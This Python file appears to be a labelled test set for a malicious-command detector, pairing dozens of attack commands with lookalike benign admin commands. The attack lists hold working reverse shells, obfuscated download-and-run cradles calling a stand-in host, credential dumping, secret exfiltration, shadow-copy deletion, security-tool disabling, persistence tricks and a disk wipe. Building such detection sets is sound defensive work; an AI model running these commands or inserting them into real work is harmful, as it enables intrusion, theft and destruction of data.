        "ps-concat": rf"""powershell -c "&('i'+'ex') (&('i'+'rm') '{U}/a')" """,
        "ps-backtick": rf"""powershell -c "I`E`X (N`ew-Ob`ject Net.Web`Client).Down`loadStr`ing('{U}/a')" """,
        "ps-env-iex": rf"""powershell -c "& ($env:ComSpec[4,24,25]-join'') (irm {U}/a)" """,
        "ps-pshome-iex": rf"""powershell ".($pshome[4]+$pshome[30]+'x') (New-Object Net.WebClient).DownloadString('{U}/a')" """,
        "ps-xor": rf"""powershell -c "$b=[Convert]::FromBase64String('{xor_b64(PAY, 0x35)}');for($i=0;$i -lt $b.Count;$i++){{$b[$i]=$b[$i] -bxor 0x35}};iex([Text.Encoding]::ASCII.GetString($b))" """,
        "ps-deflate": rf"""powershell -nop -w hidden -c "iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{deflate_b64(PAY)}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" """,
        "ps-enc-short": rf"powershell -e {b64u16(PAY)}",
        "ps-enc-weird-flag": rf"powershell -NoP -NonI -W Hidden -EncodedC {b64u16(PAY)}",
        "ps-enc-caret-flag": rf"powershell /w 1 /e^c {b64u16(PAY)}",
        "ps-reverse": rf"""powershell -c "$s=')a/{H}//:ptth mri(xei';iex(-join $s[-1..-($s.Length)])" """,
        "mshta-vbs": rf'''mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w hidden -c iwr {U}/a -o $env:temp\a.exe"",0:close")''',
        "mshta-js-sct": rf'''mshta javascript:a=GetObject("script:{U}/a.sct").Exec();close();''',
        "squiblydoo": rf"regsvr32 /s /n /u /i:{U}/a.sct scrobj.dll",
        "wmic-xsl": rf'wmic os get /format:"{U}/a.xsl"',
        "bitsadmin": rf"bitsadmin /transfer j /download /priority high {U}/a.exe %APPDATA%\a.exe & %APPDATA%\a.exe",
        "schtasks-enc": rf'schtasks /create /tn "Updater" /tr "powershell -w hidden -enc {b64u16(PAY)}" /sc minute /mo 5 /ru SYSTEM',
        "run-key": r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /t REG_SZ /d "C:\Users\Public\upd.exe" /f',
        "rundll-js": rf'''rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{U}/a")''',
        "forfiles": rf'forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c powershell -enc {b64u16(PAY)}"',
        "msiexec-url": rf"msiexec /q /i {U}/a.msi",
        "curl-rundll": rf"curl.exe -s -o %TEMP%\a.dll {U}/a.dll & rundll32 %TEMP%\a.dll,Start",
        "add-admin": r"net user support P@ssw0rd123 /add & net localgroup administrators support /add",
        "ransom-prep": r"vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} recoveryenabled no",
        "clear-logs": r"wevtutil cl Security & wevtutil cl System",
        "comsvcs-ordinal": r"rundll32 C:\windows\system32\comsvcs.dll,#24 624 C:\Windows\Temp\l.dmp full",
        "ntdsutil": r'ntdsutil "ac i ntds" "ifm" "create full c:\temp\x" q q',
        "defender-off": r'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\"',
        "fw-off": r"netsh advfirewall set allprofiles state off",
        "esentutl-ntds": r"esentutl.exe /y /vss C:\Windows\ntds\ntds.dit /d c:\temp\n.dit",
        "finger-clickfix": rf"cmd /c finger run@{H} | cmd",
        "conhost-headless": rf"conhost.exe --headless powershell -w hidden -c iex(irm {U}/a)",
        "webdav-rundll": rf"rundll32 \\{H}@80\dav\a.dll,Entry",
        "clickfix-bareip": rf'powershell -w h -c "iex(irm {H}/x)" # Verify you are human - Cloudflare ID 44812',
        "hex-ip": r"curl -s http://0xcb007109/a | sh",
        "dec-ip": r"wget -qO- http://3405803785/a | bash",
        "curl-cmd": rf"curl -s {U}/a.bat | cmd",
        "ps-sslbypass": rf"""powershell -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};IEX(New-Object Net.WebClient).DownloadString('https://{H}/a')" """,
        "certutil-decode-run": r"certutil -decode %TEMP%\a.txt %TEMP%\a.exe & start %TEMP%\a.exe",
        "ps-addtype-valloc": r"""powershell -ep bypass -c "$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);' -Name W -PassThru;$k::VirtualAlloc(0,4096,0x3000,0x40)" """,
        "recon-burst": r'whoami /all & net group "domain admins" /domain & nltest /domain_trusts & net view /domain',
        # Linux
        "bash-devtcp": rf"bash -i >& /dev/tcp/{H}/4444 0>&1",
        "mkfifo": rf"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {H} 4444 >/tmp/f",
        "curl-sh-flags": rf"curl -fsSL {U}/x.sh | sudo bash -s -- --quiet",
        "sh-c-subst": rf'sh -c "$(curl -fsSL {U}/x)"',
        "bash-procsub": rf"bash <(curl -s {U}/x)",
        "eval-b64": f"eval \"$(echo {base64.b64encode(f'curl -s {U}/x|sh'.encode()).decode()} | base64 -d)\"",
        "xxd-sh": "echo " + f"curl -s {U}/x|sh".encode().hex() + " | xxd -r -p | sh",
        "printf-hex": "printf '" + "".join(f"\\x{b:02x}" for b in f"curl -s {U}/x|sh".encode()) + "' | sh",
        "rev-sh": "rev <<< '" + f"curl -s {U}/x|sh"[::-1] + "' | sh",
        "py-exec-b64": "python3 -c \"import base64;exec(base64.b64decode('" + base64.b64encode(f"import os;os.system('curl -s {U}/x|sh')".encode()).decode() + "'))\"",
        "drop-chmod-run": rf"curl -s {U}/x -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
        "cron-persist": rf'(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s {U}/x | sh") | crontab -',
        "ssh-key-persist": r"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@kali' >> /root/.ssh/authorized_keys",
        "suid-bash": r"cp /bin/bash /tmp/.b; chmod u+s /tmp/.b",
        "hist-clear": r"history -c; unset HISTFILE; rm -f ~/.bash_history",
        "miner": r"./xmrig -o pool.minexmr.com:4444 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A -p x --background",
        "sudoers": r"echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "uid0-user": r"useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm",
        "shadow-exfil": rf"cat /etc/shadow | nc {H} 9001",
        "tar-exfil": rf"tar czf - /home /etc 2>/dev/null | curl -s -T - {U}/up",
        "openssl-shell": rf"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {H}:443 > /tmp/s; rm /tmp/s",
        "socat-shell": rf"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{H}:4444",
        "awk-shell": rf"""awk 'BEGIN {{s = "/inet/tcp/0/{H}/4444"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
        "docker-escape": r"docker run -v /:/host --privileged -it alpine chroot /host /bin/sh",
        "ld-preload": r"echo /tmp/.lib.so >> /etc/ld.so.preload",
        "wipe": r"dd if=/dev/zero of=/dev/sda bs=1M",
        "iptables-flush-kill": r"iptables -F; systemctl stop firewalld; setenforce 0; pkill -9 -f falcon-sensor",
        "systemd-persist": rf"printf '[Service]\nExecStart=/bin/sh -c \"curl -s {U}/x|sh\"\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/upd.service; systemctl enable --now upd",
        "mac-quarantine": rf"curl -s {U}/a.dmg -o /tmp/a.dmg && xattr -d com.apple.quarantine /tmp/a.dmg && hdiutil attach /tmp/a.dmg",
        "mac-keychain": r"security find-generic-password -wa 'Chrome'",
        "mac-launchagent": r"launchctl load -w ~/Library/LaunchAgents/com.apple.updater.plist && chmod +x /Users/Shared/.upd && /Users/Shared/.upd",
    }
    benign = {
        "temp-clean": r'powershell -Command "Get-ChildItem $env:TEMP | Remove-Item -Recurse -Force"',
        "certutil-hash": r"certutil -hashfile C:\Users\bob\Downloads\ubuntu.iso SHA256",
        "docker-script-dl": r"curl -fsSL https://get.docker.com -o get-docker.sh",
        "gh-api-jq": r"curl -s https://api.github.com/repos/cli/cli/releases/latest | jq -r .tag_name",
        "wget-tar": r"wget https://example.com/file.tar.gz && tar xzf file.tar.gz",
        "docker-test": r"docker run --rm -it -v $(pwd):/app -w /app node:20 npm test",
        "schtasks-query": r"schtasks /query /fo LIST /v",
        "reg-query-run": r"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        "ps-build": r"powershell -ExecutionPolicy Bypass -File .\build.ps1 -Configuration Release",
        "b64-hello": r'echo "SGVsbG8gd29ybGQ=" | base64 -d',
        "ssh-tunnel": r"ssh -L 8080:localhost:80 deploy@bastion.example.com",
        "nc-portcheck": r"nc -zv db.example.com 5432",
        "openssl-check": r"openssl s_client -connect example.com:443 -servername example.com </dev/null",
        "rundll-cpl": r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        "rundll-printer": r"rundll32 printui.dll,PrintUIEntry /in /n \\printsrv\HP-Floor2",
        "msiexec-local": r"msiexec /i C:\installers\7z2301-x64.msi /qn /norestart",
        "wmic-bios": r"wmic bios get serialnumber",
        "wevtutil-query": r"wevtutil qe Security /c:5 /rd:true /f:text",
        "vss-list": r"vssadmin list shadows",
        "bcdedit-enum": r"bcdedit /enum",
        "fw-show": r"netsh advfirewall show allprofiles",
        "mp-get": r"powershell Get-MpPreference",
        "mp-enable": r"powershell Set-MpPreference -DisableRealtimeMonitoring $false",
        "deploy-sh": r"chmod +x deploy.sh && ./deploy.sh production",
        "crontab-l": r"crontab -l",
        "nginx-restart": r"sudo systemctl restart nginx",
        "find-delete-logs": r'find /var/log/app -name "*.log" -mtime +7 -delete',
        "tar-backup": r"tar czf /backups/etc-$(date +%F).tgz /etc",
        "rsync": r"rsync -avz --delete /data/ backup@nas.example.com:/backups/data/",
        "cat-passwd": r"cat /etc/passwd",
        "py-b64-print": r"""python3 -c "import base64;print(base64.b64encode(b'hi').decode())" """,
        "iptables-list": r"iptables -L -n -v",
        "kubectl-get": r"kubectl get pods -A -o wide",
        "docker-exec": r"docker exec -it web bash",
        "mktemp-jq": r"tmp=$(mktemp); curl -s https://example.com/data.json > $tmp; jq . $tmp; rm $tmp",
        "chrome-headless": r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --dump-dom https://example.com',
        "ps-b64-png": r"""powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('logo.png'))" """,
        "iwr-health": r"Invoke-WebRequest https://example.com/health -UseBasicParsing | Select-Object StatusCode",
        "net-use": r"net use Z: \\fileserver\share /persistent:yes",
        "taskkill": r"taskkill /f /im chrome.exe",
        "sc-stop": r"sc stop spooler && sc start spooler",
        "for-hostname": r"for /f %i in ('hostname') do echo %i",
        "delayed-echo": r'cmd /v /c "set a=hello&& echo !a!"',
        "ps-format-benign": r"""powershell -c "'{0} has {1} items' -f $env:COMPUTERNAME,(Get-ChildItem).Count" """,
        "ps-replace-benign": r"""powershell -c "(Get-Content app.config).Replace('localhost','db01') | Set-Content app.config" """,
        "py-http": r"python3 -m http.server 8000",
        "scp": r"scp build.tar.gz deploy@web01.example.com:/tmp/",
        "useradd": r"sudo useradd -m -s /bin/bash -G docker alice",
        "authorized-keys-own": r"cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys",
        "dd-usb-iso": r"sudo dd if=ubuntu-24.04.iso of=/dev/sdb bs=4M status=progress",
        "xattr-own": r"xattr -d com.apple.quarantine ~/Applications/MyTool.app",
        "launchctl-list": r"launchctl list | grep com.apple",
        "history-grep": r"history | grep ssh",
        "sudoers-visudo": r"sudo visudo -c",
        "choco": r"choco install git -y",
        "winget": r"winget install --id Microsoft.PowerToys -e",
        "ps-module": r"Install-Module -Name Az -Scope CurrentUser -Force",
        "iex-profile": r"Invoke-Expression (Get-Content .\env.ps1 -Raw)",
        "wsl-update": r"wsl --update && wsl --shutdown",
        "pip-url": r"pip install https://github.com/psf/requests/archive/refs/heads/main.zip",
        "ansible": r"ansible all -m shell -a 'uptime' -i inventory.ini",
        "xxd-view": r"xxd -l 64 firmware.bin",
        "rev-word": r"echo hello | rev",
        "printf-fmt": r"printf '%s\n' \"$PATH\" | tr ':' '\n'",
    }
    return _field("f1", attacks, benign)


def _field_round2() -> tuple[list[Case], list[Case]]:
    import base64
    import zlib  # noqa: F401

    H = "203.0.113.9"
    U = f"http://{H}"


    def b64(s: str) -> str:
        return base64.b64encode(s.encode()).decode()


    def b64u16(s: str) -> str:
        return base64.b64encode(s.encode("utf-16-le")).decode()


    SH = f"curl -s {U}/x|sh"
    ENC = b64u16(f"IEX (New-Object Net.WebClient).DownloadString('{U}/a.ps1')")

    attacks = {
        "b64-drop-decode-run": rf"cmd /c echo {b64('MZ fake payload bytes here')} > %temp%\a.b64 & certutil -decode %temp%\a.b64 %temp%\a.exe & %temp%\a.exe",
        "bits-ps": rf'powershell -c "Start-BitsTransfer -Source {U}/a.exe -Destination $env:TEMP\a.exe; Start-Process $env:TEMP\a.exe"',
        "renamed-lolbin": rf"cmd /c copy /b %windir%\system32\certutil.exe %temp%\c.exe & %temp%\c.exe -urlcache -split -f {U}/a.exe %temp%\a.exe",
        "invoke-command-remote": rf"powershell -c \"Invoke-Command -ComputerName DC01 -ScriptBlock {{ iex (irm {U}/a) }}\"".replace('\\"', '"'),
        "wmic-node": rf'wmic /node:10.0.0.5 /user:corp\admin process call create "powershell -enc {ENC}"',
        "psexec-remote": rf'psexec \\10.0.0.5 -accepteula -s -d cmd /c "powershell -enc {ENC}"',
        "sc-remote-create": rf'sc \\fs01 create upd binPath= "cmd /c powershell -enc {ENC}" start= auto',
        "reg-save-hives": r"reg save HKLM\SAM C:\Windows\Temp\s & reg save HKLM\SYSTEM C:\Windows\Temp\y",
        "procdump-lsass": r"procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp",
        "vaultcmd": r'cmdkey /list & vaultcmd /listcreds:"Windows Credentials" /all',
        "collect-exfil": rf'powershell -c "Get-ChildItem -Recurse C:\Users -Include *.kdbx,*.pfx,id_rsa | Compress-Archive -DestinationPath $env:TEMP\x.zip; curl.exe -F f=@$env:TEMP\x.zip {U}/u"',
        "rclone-exfil": r"rclone.exe copy \\fs01\finance mega:backup --config C:\ProgramData\r.conf --transfers 32",
        "7z-password-share": r"7z a -pS3cret -mhe C:\ProgramData\d.7z \\fs01\finance\*",
        "usn-delete": r"fsutil usn deletejournal /d c:",
        "icacls-everyone": r"icacls C:\ /grant Everyone:F /T /C /Q",
        "shadow-wmi-delete": r'powershell -c "Get-WmiObject Win32_ShadowCopy | % {$_.Delete()}"',
        "safeboot-reboot": r"bcdedit /set {default} safeboot minimal & shutdown /r /t 0",
        "stop-av-services": r'net stop "Sophos AutoUpdate Service" /y & sc config WinDefend start= disabled',
        "kill-defender": r"taskkill /f /im MsMpEng.exe",
        "defender-policy": r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        "enable-rdp": r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=yes',
        "wdigest": r"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
        "ifeo-sethc": r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f',
        "utilman-swap": r"copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe",
        "fodhelper": r'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c C:\Users\Public\a.exe" /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f & fodhelper.exe',
        "startup-lnk": r"""powershell -c "$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut($env:APPDATA+'\Microsoft\Windows\Start Menu\Programs\Startup\u.lnk');$l.TargetPath='C:\Users\Public\u.exe';$l.Save()" """,
        "odbcconf": r"odbcconf /a {REGSVR C:\Users\Public\a.dll}",
        "cmstp": r"cmstp.exe /ni /s C:\Users\Public\a.inf",
        "msbuild-public": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\a.xml",
        "mavinject": r"mavinject.exe 1234 /INJECTRUNNING C:\Users\Public\a.dll",
        "curl-pipe-ps": rf"curl -s {U}/a.ps1 | powershell -nop -",
        "type-pipe-ps": r"type C:\Users\Public\a.txt | powershell -nop -w hidden -",
        "ssh-rsocks": rf"ssh -o StrictHostKeyChecking=no -R 9050 tunnel@{H} -N -f",
        "ngrok-rdp": r"ngrok.exe tcp 3389 --authtoken 2abcDEF",
        "cloudflared-rdp": r"cloudflared.exe tunnel --url rdp://localhost:3389",
        "chisel": rf"chisel.exe client {H}:8080 R:socks",
        "anydesk-silent": r"C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent & echo P@ssw0rd | C:\ProgramData\AnyDesk\AnyDesk.exe --set-password",
        "adfind": r'adfind.exe -f "(objectcategory=person)" > C:\ProgramData\ad_users.txt',
        "sharphound": r"SharpHound.exe -c All --zipfilename loot.zip",
        "setspn-all": r"setspn -T corp.example -Q */*",
        "wmi-shadow-wmic": r"wmic shadowcopy delete /nointeractive",
        # Linux
        "revshell-loop": rf"nohup bash -c 'while true; do bash -i >& /dev/tcp/{H}/443 0>&1; sleep 60; done' &",
        "php-shell": rf"""php -r '$s=fsockopen("{H}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "ncat-e": rf"ncat {H} 4444 -e /bin/bash",
        "nc-listen-e": r"nc -lvnp 4444 -e /bin/sh",
        "busybox-nc": rf"busybox nc {H} 4444 -e sh",
        "telnet-shell": rf"telnet {H} 4444 | /bin/sh | telnet {H} 4445",
        "curl-python": rf"curl -s {U}/x.py | python3 -",
        "mirai-style": rf"cd /tmp || cd /var/run || cd /mnt; wget {U}/mips; chmod 777 mips; ./mips; rm -f mips",
        "tftp-drop": rf"tftp -g -r x {H}; chmod 777 x; ./x",
        "at-shell": rf"echo 'bash -i >& /dev/tcp/{H}/443 0>&1' | at now + 1 minute",
        "histfile-null": r"export HISTFILE=/dev/null; ln -sf /dev/null ~/.bash_history",
        "log-wipe": r"shred -u /var/log/auth.log; echo > /var/log/wtmp; journalctl --vacuum-time=1s",
        "passwd-root2": r"echo 'root2:$1$x$Yq0bnJQ6cO2oK1c9p3nQf1:0:0::/root:/bin/bash' >> /etc/passwd",
        "sshd-rootlogin": r"sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config && systemctl restart sshd",
        "gtfo-find": r"sudo find . -exec /bin/sh \; -quit",
        "gtfo-vim": r"sudo vim -c ':!/bin/sh'",
        "gtfo-awk": r"""sudo awk 'BEGIN {system("/bin/sh")}'""",
        "py-setuid": r"""python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'""",
        "sniff-creds": r"tcpdump -i eth0 -w /tmp/.c.pcap port 21 or port 23 or port 110",
        "hunt-keys": r"find / -name id_rsa 2>/dev/null; cat ~/.aws/credentials; grep -rI 'password' /var/www 2>/dev/null",
        "env-exfil": rf"env | grep -i -E 'key|secret|token' | curl -s -d @- {U}/c",
        "imds-creds": r"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "k8s-secrets": r"kubectl get secrets -A -o yaml > /tmp/.s; cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "aws-backdoor-key": r"aws iam create-access-key --user-name admin; aws iam attach-user-policy --user-name admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        "masscan": r"masscan 10.0.0.0/8 -p445,3389 --rate 10000 -oL /tmp/.m",
        "hydra": r"hydra -l root -P rockyou.txt ssh://10.0.0.5 -t 4",
        "sqlmap-os-shell": r'sqlmap -u "http://10.0.0.8/item?id=1" --batch --os-shell',
        "msfvenom": rf"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={H} LPORT=443 -f elf -o /tmp/m",
        "b64-herestring-bash": f"base64 -d <<< {b64(SH)} | bash",
        "bash-c-b64-subst": f'bash -c "$(base64 -d <<< {b64(SH)})"',
        "b64-decode-long": f"echo {b64(SH)} | base64 --decode | bash",
        "openssl-b64": f"echo {b64(SH)} | openssl enc -d -base64 | sh",
        "py-print-b64-sh": f"""python3 -c 'print(__import__("base64").b64decode("{b64(SH)}").decode())' | sh""",
        "cmd-subst-names": f"$(echo {b64('curl')} | base64 -d) -s {U}/x | $(echo {b64('sh')} | base64 -d)",
        "octal-ansi": rf"x=$'\143\165\162\154'; $x -s {U}/x | sh",
        "cron-hourly": rf"echo 'curl -s {U}/x | sh' > /etc/cron.hourly/upd; chmod +x /etc/cron.hourly/upd",
        "ifs-comma": rf"IFS=,;c=curl,-s,{U}/x;$c|sh",
        "herestring-sh": rf'sh <<< "$(curl -s {U}/x)"',
        "tee-sh": rf"curl -s {U}/x | tee /tmp/.x | sh",
        "dot-procsub": rf". <(curl -s {U}/x)",
        "devtcp-http": rf"""exec 3<>/dev/tcp/{H}/80; echo -e "GET /x HTTP/1.0\r\n\r\n" >&3; cat <&3 | sh""",
        "mac-b64-D": f"echo {b64(SH)} | base64 -D | sh",
        "mac-loginhook": r"defaults write com.apple.loginwindow LoginHook /Users/Shared/.h.sh",
        "mac-chrome-logins": r"""sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data "select origin_url,username_value,password_value from logins" """,
        "mac-gatekeeper-off": r"sudo spctl --master-disable",
        "mac-osascript-sh": rf"""osascript -e 'do shell script "curl -s {U}/x | sh"'""",
    }
    benign = {
        "bits-msu": r'powershell -c "Start-BitsTransfer -Source https://download.microsoft.com/kb5031356.msu -Destination C:\patches\"',
        "invoke-command-svc": r"Invoke-Command -ComputerName web01 -ScriptBlock { Get-Service W3SVC }",
        "wmic-node-os": r"wmic /node:web01 os get caption",
        "sc-remote-query": r"sc \\web01 query w3svc",
        "reg-add-app": r"reg add HKCU\Software\MyApp /v Theme /d dark /f",
        "7z-backup": r"7z a backup.7z C:\Projects\site",
        "icacls-iis": r'icacls C:\inetpub\wwwroot /grant "IIS_IUSRS:(OI)(CI)RX"',
        "spooler-restart": r"net stop spooler & net start spooler",
        "attrib": r"attrib -h -s desktop.ini",
        "imds-instance-id": r"curl -s http://169.254.169.254/latest/meta-data/instance-id",
        "s3-sync": r"aws s3 sync ./build s3://my-site --delete",
        "tcpdump-443": r"sudo tcpdump -i eth0 port 443 -c 100",
        "grep-todo": r'grep -rn "TODO" src/',
        "find-conf": r'find /etc -name "*.conf" 2>/dev/null | head',
        "sed-env": r"sed -i 's/DEBUG=true/DEBUG=false/' .env",
        "journal-since": r'journalctl -u nginx --since "1 hour ago"',
        "journal-vacuum": r"sudo journalctl --vacuum-time=30d",
        "apt": r"sudo apt-get update && sudo apt-get install -y curl",
        "curl-less": r"curl -sSL https://example.com/install.sh -o install.sh && less install.sh",
        "wget-jq": r"wget -qO- https://example.com/status.json | jq .",
        "cron-backup": r'echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -',
        "histsize": r"export HISTSIZE=10000",
        "chattr-resolv": r"sudo chattr +i /etc/resolv.conf",
        "gcc-run": r"gcc -O2 -o app main.c && ./app",
        "ssh-keygen": r'ssh-keygen -t ed25519 -C "me@example.com"',
        "ssh-copy-id": r"ssh-copy-id deploy@web01.example.com",
        "mount-usb": r"sudo mount /dev/sdb1 /mnt/usb",
        "php-version": r"php -r 'echo PHP_VERSION;'",
        "perl-print": r"""perl -e 'print "hi\n"'""",
        "node-e": r'node -e "console.log(require(\"os\").hostname())"',
        "py-hostname": r'python -c "import socket;print(socket.gethostname())"',
        "telnet-smtp": r"telnet mail.example.com 25",
        "defaults-finder": r"defaults write com.apple.finder AppleShowAllFiles -bool true",
        "sqlite-count": r'sqlite3 app.db "select count(*) from users"',
        "spctl-status": r"spctl --status",
        "openssl-b64-file": r"openssl enc -d -base64 -in cert.b64 -out cert.der",
        "shadow-list-ps": r'powershell -c "Get-WmiObject Win32_ShadowCopy | Select-Object InstallDate"',
        "setspn-list": r"setspn -L svc_sql",
        "cmdkey-list": r"cmdkey /list",
        "taskkill-notepad": r"taskkill /f /im notepad.exe",
        "reg-save-app": r"reg save HKCU\Software\MyApp backup.hiv",
        "zip-logs": r"Get-ChildItem -Recurse -Include *.log | Compress-Archive -DestinationPath logs.zip",
        "curl-upload-api": r"curl -F file=@report.pdf https://api.example.com/upload",
        "msbuild-sln": r"msbuild MySolution.sln /p:Configuration=Release",
        "installutil-svc": r"InstallUtil.exe MyService.exe",
        "tar-extract": r"tar -xf archive.tar -C C:\tools",
        "shutdown": r"shutdown /r /t 0",
        "find-exec-rm": r"sudo find . -name '*.tmp' -exec rm {} \;",
        "vim-wq": r"vim -c ':wq' notes.txt",
        "awk-print": r"""awk 'BEGIN {print "hi"}'""",
        "at-backup": r"at now + 1 hour -f backup.sh",
        "shred-file": r"shred -u old-secrets.txt",
        "nc-listen": r"nc -l 8080",
        "copy-cmd": r"copy /y C:\build\out\app.exe C:\deploy\app.exe",
        "sshd-restart": r"sudo systemctl restart sshd",
        "passwd-change": r"sudo passwd alice",
        "kubectl-secret-create": r"kubectl create secret generic db --from-literal=password=changeme",
        "aws-list-keys": r"aws iam list-access-keys --user-name alice",
        "rdp-query": r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections',
        "tee-log": r"make 2>&1 | tee build.log",
        "source-venv": r". venv/bin/activate",
        "cd-tmp-ls": r"cd /tmp && ls -la",
        "chmod-777-dir": r"chmod 777 /srv/uploads",
        "psexec-local": r"psexec -s -i regedit.exe",
        "anydesk-run": r'"C:\Program Files (x86)\AnyDesk\AnyDesk.exe"',
        "net-stop-app": r'net stop "MyApp Service"',
        "sc-config-app": r"sc config MyAppSvc start= auto",
        "cloudflared-http": r"cloudflared tunnel --url http://localhost:3000",
    }
    return _field("f2", attacks, benign)


_F1A, _F1B = _field_round1()
_F2A, _F2B = _field_round2()
FIELD_ATTACKS: list[Case] = [*_F1A, *_F2A]
FIELD_BENIGN: list[Case] = [*_F1B, *_F2B]
